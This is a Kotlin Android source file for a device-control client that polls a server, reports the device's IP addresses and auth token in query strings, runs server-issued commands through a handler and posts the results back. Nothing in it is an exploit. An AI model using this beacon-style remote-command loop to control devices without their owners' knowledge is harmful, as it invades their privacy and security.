package com.example.devicecontrol

import android.util.Log
import okhttp3.*
import okhttp3.HttpUrl.Companion.toHttpUrl
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit
import java.util.concurrent.Executors

import java.net.NetworkInterface
import java.net.Inet6Address
import java.net.Inet4Address
import java.util.Collections

class PollingManager(
    private val baseUrl: String,
    private val clientId: String,
    private val authToken: String,
    private val handler: CommandHandler,
    private val isTurbo: Boolean = true,
    // Callback dipanggil saat server menginstruksikan ganti mode
    private val onModeChanged: ((newIsTurbo: Boolean) -> Unit)? = null
) {
    // Timeout lebih pendek untuk mode Turbo agar cepat reconnect jika putus
    private val client = OkHttpClient.Builder()
        .connectTimeout(if (isTurbo) 10L else 30L, TimeUnit.SECONDS)
        .readTimeout(if (isTurbo) 15L else 60L, TimeUnit.SECONDS)
        .writeTimeout(20L, TimeUnit.SECONDS)
        .build()

    private val executor = Executors.newSingleThreadScheduledExecutor()
    @Volatile private var isRunning = false
    private val TAG = "PollingManager"

    private var currentInterval = if (isTurbo) 1000L else 5000L
    private val maxInterval = 30000L

    private fun getPublicIPv6(): String? {
        try {
            val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
            for (intf in interfaces) {
                if (!intf.isUp || intf.isLoopback) continue
                val addrs = Collections.list(intf.inetAddresses)
                for (addr in addrs) {
                    if (addr is Inet6Address) {
                        if (addr.isLoopbackAddress || addr.isLinkLocalAddress ||
                            addr.isMulticastAddress || addr.isSiteLocalAddress) continue
                        val sAddr = addr.hostAddress
                        val delim = sAddr.indexOf('%')
                        val cleanAddr = if (delim < 0) sAddr.uppercase() else sAddr.substring(0, delim).uppercase()
                        if (cleanAddr.startsWith("2") || cleanAddr.startsWith("3")) return cleanAddr
                        return cleanAddr
                    }
                }
            }
        } catch (e: Exception) { Log.e(TAG, "IPv6 Error: ${e.message}") }
        return null
    }

    private fun getPublicIPv4(): String? {
        try {
            val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
            for (intf in interfaces) {
                if (!intf.isUp || intf.isLoopback) continue
                val addrs = Collections.list(intf.inetAddresses)
                for (addr in addrs) {
                    if (addr is Inet4Address && !addr.isLoopbackAddress) {
                        return addr.hostAddress
                    }
                }
            }
        } catch (e: Exception) { Log.e(TAG, "IPv4 Error: ${e.message}") }
        return null
    }

    fun start() {
        if (isRunning) return
        isRunning = true
        poll()
    }

    fun stop() {
        isRunning = false
        executor.shutdownNow()
    }

    fun sendOfflineSignal() {
        try {
            val url = baseUrl.toHttpUrl().newBuilder()
                .addPathSegment("poll")
                .addQueryParameter("client_id", clientId)
                .addQueryParameter("auth", authToken)
                .addQueryParameter("offline", "1")
                .build()

            val request = Request.Builder().url(url).build()

            Thread {
                try {
                    client.newCall(request).execute().close()
                    Log.d(TAG, "Offline signal sent successfully")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to send offline signal: ${e.message}")
                }
            }.start()
        } catch (e: Exception) {
            Log.e(TAG, "Offline signal error: ${e.message}")
        }
    }

    private fun poll() {
        if (!isRunning) return

        try {
            val ipv6 = getPublicIPv6() ?: ""
            val ipv4 = getPublicIPv4() ?: ""
            val urlBuilder = baseUrl.toHttpUrl().newBuilder()
                .addPathSegment("poll")
                .addQueryParameter("client_id", clientId)
                .addQueryParameter("auth", authToken)
                .addQueryParameter("mode", if (isTurbo) "short" else "long")

            if (ipv6.isNotEmpty()) urlBuilder.addQueryParameter("ipv6", ipv6)
            if (ipv4.isNotEmpty()) urlBuilder.addQueryParameter("ipv4", ipv4)

            val request = Request.Builder()
                .url(urlBuilder.build())
                .addHeader("Connection", "keep-alive")
                .build()

            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    if (!isRunning) return
                    Log.e(TAG, "Polling failed: ${e.message}")
                    currentInterval = (currentInterval * 1.5).toLong().coerceAtMost(maxInterval)
                    scheduleNext(currentInterval)
                }

                override fun onResponse(call: Call, response: Response) {
                    if (!isRunning) return
                    response.use {
                        if (!it.isSuccessful) {
                            Log.e(TAG, "Server error: ${it.code}")
                            currentInterval = (currentInterval * 1.5).toLong().coerceAtMost(maxInterval)
                            scheduleNext(currentInterval)
                        } else {
                            currentInterval = if (isTurbo) 1000L else 5000L
                            val body = it.body?.string() ?: ""
                            try {
                                if (body.isNotEmpty()) {
                                    val json = JSONObject(body)

                                    // ── Deteksi perubahan mode dari server ──
                                    val serverMode = json.optString("polling_mode", "")
                                    if (serverMode.isNotEmpty()) {
                                        val serverIsTurbo = serverMode == "turbo" || serverMode == "short"
                                        if (serverIsTurbo != isTurbo) {
                                            Log.i(TAG, "Mode berubah: ${if (isTurbo) "turbo" else "normal"} → $serverMode")
                                            // Stop dulu agar tidak double-poll
                                            isRunning = false
                                            // Panggil callback ke ControlService untuk restart dengan mode baru
                                            onModeChanged?.invoke(serverIsTurbo)
                                            return@use
                                        }
                                    }

                                    // ── Eksekusi command jika ada ──
                                    val command = json.optString("command", "none")
                                    if (command != "none") {
                                        Log.i(TAG, "Executing: $command")
                                        handler.handle(body) { result -> sendResponse(result) }
                                    }
                                }
                            } catch (e: Exception) {
                                Log.e(TAG, "JSON error: ${e.message}")
                            }
                            scheduleNext(currentInterval)
                        }
                    }
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "URL error: ${e.message}")
            scheduleNext(10000L)
        }
    }

    private fun sendResponse(jsonResponse: String) {
        try {
            val url = baseUrl.toHttpUrl().newBuilder()
                .addPathSegment("response")
                .addQueryParameter("client_id", clientId)
                .addQueryParameter("auth", authToken)
                .build()

            val body = jsonResponse.toRequestBody("application/json".toMediaType())
            val request = Request.Builder().url(url).post(body).build()

            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    Log.e(TAG, "Failed to send response: ${e.message}")
                }
                override fun onResponse(call: Call, response: Response) {
                    response.close()
                }
            })
        } catch (e: Exception) {}
    }

    private fun scheduleNext(delayMs: Long) {
        if (isRunning) {
            executor.schedule({ poll() }, delayMs, TimeUnit.MILLISECONDS)
        }
    }
}
